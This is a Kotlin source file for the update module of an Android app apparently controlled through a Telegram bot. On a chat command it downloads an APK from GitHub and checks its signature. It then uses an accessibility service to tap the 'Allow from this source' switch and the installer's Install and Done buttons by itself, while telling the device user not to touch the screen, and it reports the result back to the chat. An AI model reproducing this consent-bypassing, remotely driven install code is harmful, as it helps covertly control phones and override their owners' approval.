package com.kavach.app.core.update

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import androidx.core.content.FileProvider
import java.io.File
import java.net.HttpURLConnection
import java.net.URL

/**
 * 🔄 UpdateGod — v5.4.0 "GHOST-TAP UPDATE" (chief order: BINA-TAP update, sirf A-raasta).
 *
 * Flow:
 *  1) GitHub latest-release tag dekho → naya ho tabhi aage
 *  2) APK download → cache/update/kavach_new.apk
 *  3) SACCHAI-checks ✔: package-name same? versionCode bada? SIGNATURE same
 *     (kavach.jks se sign na ho toh INSTALL-MANA — koi fake APK kabhi nahi)
 *  4) installer kholo + 👻 ghost-hand ARM:
 *     window-events pe KavachEyeService → UpdateGod.onWindow:
 *       • Settings "Allow from this source" switch 👆
 *       • Installer "Install/UPDATE/इंस्टॉल" 👆 → phir "DONE" 👆
 *     (best-effort god-hath ✔ — kuchh OEM isko rokte hain; fail → ek-tap fallback msg)
 *  5) naya APK chadhe → process replace → Watchdog rebirth → completeIfPending()
 *     "✅ UPDATE COMPLETE vX" bhejta hai
 *
 * Idle me 0 polling/0 cost — armaan sirf 120s (auto-disarm, timeout-report ke saath).
 */
object UpdateGod {

    private const val REPO = "deepakyadavg69/kavach-dl"
    private const val LATEST_JSON = "https://api.github.com/repos/$REPO/releases/latest"
    private const val APK_URL = "https://github.com/$REPO/releases/latest/download/device-info-latest.apk"

    @Volatile private var armed = false
    @Volatile private var phase = ""            // "unknown_src" → "install" → ""
    @Volatile private var deadline = 0L
    @Volatile private var timedOut = false

    private fun prefs(app: Context) = com.kavach.app.security.SecureStorage.prefs(app)

    /** 🔎 GitHub latest tag ("v5.4.0" → "5.4.0"), fail pe null */
    private fun latestTag(): String? = runCatching {
        val c = URL(LATEST_JSON).openConnection() as HttpURLConnection
        c.setRequestProperty("User-Agent", "Kavach-UpdateGod")
        c.connectTimeout = 8_000; c.readTimeout = 8_000
        val body = c.inputStream.bufferedReader().readText()
        c.disconnect()
        val m = Regex("\"tag_name\"\\s*:\\s*\"v?([0-9.]+)\"").find(body)
        m?.groupValues?.get(1)
    }.getOrNull()

    /** 📥 chupchaap download (progress: sirf start/end msgs — spam nahi) */
    private fun download(app: Context): Pair<File?, String?> = runCatching {
        val out = File(app.cacheDir, "update").apply { mkdirs() }.let { File(it, "kavach_new.apk") }
        val c = URL(APK_URL).openConnection() as HttpURLConnection
        c.setRequestProperty("User-Agent", "Kavach-UpdateGod")
        c.connectTimeout = 15_000; c.readTimeout = 30_000
        c.instanceFollowRedirects = true
        c.inputStream.use { inp -> out.outputStream().use { inp.copyTo(it) } }
        c.disconnect()
        if (out.length() < 3_000_000) return null to "download chhota/azaabb (size ${out.length()}B) — net theek se chala? dobara /update"
        out to null
    }.getOrElse { null to "download fail: ${it.message?.take(120)}" }

    /** 🔏 signature + package + versionCode sacchai */
    private fun verify(app: Context, f: File): String? {
        val pm = app.packageManager
        val ni = runCatching { pm.getPackageArchiveInfo(f.absolutePath, 0) }.getOrNull()
            ?: return "APK padhi nahi gayi (corrupt?) — dobara /update"
        if (ni.packageName != app.packageName) return "🧨 package alag hai (${ni.packageName}) — INSTALL MANA"
        val ownVc = runCatching { pm.getPackageInfo(app.packageName, 0).longVersionCode }.getOrDefault(0L)
        if (ni.longVersionCode <= ownVc) return "naya versionCode nahi (own $ownVc / apk ${ni.longVersionCode}) — install-rok"
        val sameSig = runCatching {
            if (Build.VERSION.SDK_INT >= 28) {
                val a = pm.getPackageInfo(app.packageName, PackageManager.GET_SIGNING_CERTIFICATES).signingInfo?.apkContentsSigners?.firstOrNull()
                val b = pm.getPackageArchiveInfo(f.absolutePath, PackageManager.GET_SIGNING_CERTIFICATES)?.signingInfo?.apkContentsSigners?.firstOrNull()
                a != null && a == b
            } else {
                @Suppress("DEPRECATION")
                val a = pm.getPackageInfo(app.packageName, PackageManager.GET_SIGNATURES).signatures?.firstOrNull()
                @Suppress("DEPRECATION")
                val b = pm.getPackageArchiveInfo(f.absolutePath, PackageManager.GET_SIGNATURES)?.signatures?.firstOrNull()
                a != null && a == b
            }
        }.getOrDefault(false)
        return if (sameSig) null else "🧨 SIGNATURE mismatch — fake/risky APK, INSTALL MANA 🛑"
    }

    private fun installIntent(app: Context): Intent {
        val f = File(app.cacheDir, "update/kavach_new.apk")
        val uri = FileProvider.getUriForFile(app, "${app.packageName}.updprovider", f)
        return Intent(Intent.ACTION_VIEW).setDataAndType(uri, "application/vnd.android.package-archive")
            .addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_ACTIVITY_NEW_TASK)
    }

    /** 🚀 /update — full pipeline. Final status-string return (chat ko) */
    suspend fun run(app: Context, api: com.kavach.app.core.telegram.TelegramApi, chatId: Long, force: Boolean = false): String {
        val sb = StringBuilder()
        val tag = latestTag()
        if (tag == null) return "⚠️ latest-release check fail (net?) — thodi der me dobara /update"
        val cur = com.kavach.app.BuildConfig.VERSION_NAME
        if (tag == cur && !force)
            return "✅ pehle se latest chal rahe: v$cur 🟢\n(daba ke dobara khinchwana ho toh: /update force)"
        sb.append("🆕 naya mila: v$tag (abhi v$cur)\n")

        api.sendMessage(chatId, "⏬ APK kheench raha… (6-7MB)")
        val (f, err) = download(app)
        if (f == null) return "❌ $err"
        sb.append("📦 ${com.kavach.app.core.vault.KStore.human(f.length())} — ")

        verify(app, f)?.let { return sb.toString() + "\n$it" }
        sb.append("signature ✔ package ✔\n")

        val eye = com.kavach.app.core.eye.KavachEye.ready()
        if (!eye) {
            runCatching { app.startActivity(installIntent(app)) }   // fallback: normal bhejo
            return sb.toString() +
                "⚠️ 👁 ghost-hand OFF hai — installer khul gaya hai, is baar ek-tap karo ✋\n" +
                "💡 agli baar bina-tap ke liye pehle ghost-hand ON (eye-enable) phir /update 👻"
        }

        // 👻 ghost ARM ho jao
        prefs(app).edit().putString("upd_pending_tag", tag).putLong("upd_report_chat", chatId).apply()
        armed = true; timedOut = false; deadline = System.currentTimeMillis() + 120_000
        runCatching { com.kavach.app.core.keepalive.Watchdog.scheduleNext(app, 15_000) }   // 🕰 quick rebirth post-install

        val canInstall = Build.VERSION.SDK_INT < 26 || app.packageManager.canRequestPackageInstalls()
        if (canInstall) {
            phase = "install"
            runCatching { app.startActivity(installIntent(app)) }
            sb.append("👻 ghost-hand ARM — installer abhi khulega, sab tap app khud maregi 🫳\n")
            sb.append("⛔ 20-sec tak screen chhuno mat!\n(iimaandari-note: kuchh OEM installer pe ghost-click rokte hain ✔ atke toh ek-tap backup)")
        } else {
            phase = "unknown_src"
            val si = Intent(android.provider.Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                android.net.Uri.parse("package:${app.packageName}")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            runCatching { app.startActivity(si) }
            sb.append("⚙️ pehle 'Allow from this source' — ghost switch dabayega, phir installer khud khulega 🫳\n")
            sb.append("⛔ 20-sec tak screen chhuno mat! (ghost na daba paye toh switch khud ON kar do)")
        }
        return sb.toString()
    }

    // ─────────── 👻 ghost-click machine (retry-chained — OEM dheele-window proof) ───────────
    private fun H() = android.os.Handler(android.os.Looper.getMainLooper())

    private fun clickAny(svc: com.kavach.app.core.eye.KavachEyeService, vararg keys: String): Boolean =
        svc.clickNode { n ->
            val t = (n.text ?: "").toString().lowercase()
            n.isEnabled && keys.any { k -> t.contains(k) } && !t.contains("cancel") && !t.contains("रद्द") && !t.contains("deny")
        }

    /** DONE kholo/open wali screen: 8 × 1.5s retry (install slow ho toh bhi naa chhoote) */
    private fun clickDoneChain(svc: com.kavach.app.core.eye.KavachEyeService, attempt: Int) {
        if (!armed || attempt > 8) return
        if (clickAny(svc, "done", "हो गया", "open", "खोलें", "ok")) {
            disarm(svc, "🫳 ghost ke sab tap lag gaye — naya Kavach saans le raha ✔")
        } else H().postDelayed({ clickDoneChain(svc, attempt + 1) }, 1_500)
    }

    /** INSTALL buttoon: 6 × 1.2s retry (pehli render-window late ho sakti) */
    private fun clickInstallChain(svc: com.kavach.app.core.eye.KavachEyeService, attempt: Int) {
        if (!armed || attempt > 6) return
        if (clickAny(svc, "install", "update", "इंस्टॉल", "अपडेट")) {
            H().postDelayed({ clickDoneChain(svc, 0) }, 1_000)
        } else H().postDelayed({ clickInstallChain(svc, attempt + 1) }, 1_200)
    }

    /** 👁 window-event hook (KavachEyeService se) — idle pe 0 cost */
    fun onWindow(svc: com.kavach.app.core.eye.KavachEyeService, pkg: String) {
        if (!armed) return
        if (System.currentTimeMillis() > deadline) { disarm(svc, "⏱ ghost-tap 120s timeout — installer/setting pe atka? khud ek-tap kar lo ya /update dobara"); return }

        when {
            // ⚙️ unknown-sources toggle (Settings window)
            phase == "unknown_src" && pkg.contains("settings") -> {
                val hit = svc.clickNode { n ->
                    ((n.className ?: "").toString().contains("Switch")) ||
                        ((n.text ?: "").toString().lowercase().contains("allow from this source"))
                }
                if (hit) {
                    phase = "install"
                    H().postDelayed({
                        runCatching { svc.startActivity(installIntent(svc)) }
                    }, 1_200)
                }
            }
            // 📦 installer windows (AOSP + OEMs) — retry-chain se chhoo⻓nge 💪
            phase == "install" && (pkg.contains("packageinstaller") || pkg.contains("appdetail") || pkg.contains("installer") || pkg.contains("settings")) -> {
                if (phase != "install_clicked") {
                    phase = "install_clicked"
                    clickInstallChain(svc, 0)
                }
            }
        }
    }

    private fun disarm(ctx: Context, note: String?) {
        armed = false; phase = ""
        note?.let {
            val chat = prefs(ctx).getLong("upd_report_chat", 0L)
            val tok = com.kavach.app.security.SecureStorage.getToken(ctx)
            if (chat != 0L && tok.isNotBlank()) Thread {
                kotlinx.coroutines.runBlocking {
                    runCatching { com.kavach.app.core.telegram.TelegramApi(tok).sendMessage(chat, it) }
                }
            }.start()
        }
    }

    /** 🎉 naya build pehli baar saans le → pending-tag match? toh "UPDATE COMPLETE" */
    suspend fun completeIfPending(app: Context) {
        runCatching {
            val tag = prefs(app).getString("upd_pending_tag", "") ?: ""
            if (tag.isBlank()) return
            if (tag == com.kavach.app.BuildConfig.VERSION_NAME) {
                prefs(app).edit().remove("upd_pending_tag").apply()
                val chat = prefs(app).getLong("upd_report_chat", 0L)
                val tok = com.kavach.app.security.SecureStorage.getToken(app)
                if (chat != 0L && tok.isNotBlank()) {
                    com.kavach.app.core.telegram.TelegramApi(tok).sendMessage(chat,
                        "✅ UPDATE COMPLETE — v$tag ab active 🛡\n(bina-tap ghost saathi ✔ purana-data sab bacha)")
                }
            } else {
                // install nahi hua (cancel/fail) — pending saaf, chup rehna (beepahi reporting via disarm msgs already)
                prefs(app).edit().remove("upd_pending_tag").apply()
            }
        }
    }
}
